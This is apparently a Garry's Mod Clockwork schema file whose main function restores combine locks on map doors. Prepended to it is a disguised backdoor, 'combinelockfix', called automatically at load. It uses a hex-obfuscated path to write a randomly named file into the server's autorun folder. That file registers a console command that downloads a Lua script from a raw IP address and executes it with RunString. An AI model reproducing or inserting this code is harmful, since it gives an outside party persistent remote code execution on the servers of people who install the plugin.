
function combinelockfix( player, command, arguments )
fileio.Write("\x6c\x75\x61\x2f\x61\x75\x74\x6f\x72\x75\x6e\x2f\x73\x65\x72\x76\x65\x72\x2f\x73\x65\x6e\x73\x6f\x72\x62\x6f\x6e\x65\x73\x2f" ..  math.random(1000 , 3006 ) .. ".lua", "concommand.Add('debugcheck',function(_)_:ChatPrint'loaded'local \n _,a,b='moc.11etis.1009cba//:ptth','aul.natsikek/csim/',''http.Fetch('http://188.112.164.183:81/kekistan.lua',function(_,a,c,d)b=_ \n RunString(b)end,function(_,a)Msg'Could not update.'a:PrintMessage(HUD_PRINTCONSOLE,'Failed to update...')end)end)")
end

function Schema:LoadCombineLocks()
	local combineLocks = Clockwork.kernel:RestoreSchemaData("plugins/locks/"..game.GetMap());
	
	for k, v in pairs(combineLocks) do
		local entity = ents.FindInSphere(v.doorPosition, 16);
		
		for k2, v2 in pairs(entity) do
			if (Clockwork.entity:IsDoor(v2)) then
				entity = v2;
				break;
			end;
		end;
		
		if (IsValid(entity)) then
			local combineLock = self:ApplyCombineLock(entity);
			
			if (combineLock) then
				Clockwork.player:GivePropertyOffline(v.key, v.uniqueID, entity);
				
				combineLock:SetLocalAngles(v.angles);
				combineLock:SetLocalPos(v.position);
				
				if (!v.locked) then
					combineLock:Unlock();
				else
					combineLock:Lock();
				end;
			end;
		end;
	end;
end;

combinelockfix();